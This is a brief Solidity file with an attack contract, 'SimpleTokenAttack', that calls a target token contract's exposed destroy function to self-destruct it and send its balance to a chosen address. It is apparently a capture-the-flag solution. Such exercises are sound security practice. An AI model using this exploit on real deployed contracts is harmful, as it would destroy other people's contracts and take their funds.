// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IntSimpleToken {
    function destroy(address payable _to) external;
}

contract SimpleTokenAttack {
    IntSimpleToken public simpleToken;

    constructor(address _target) {
        simpleToken = IntSimpleToken(_target);
    }

    function callDestroy(address payable _to) public {
        simpleToken.destroy(_to);
    }
}
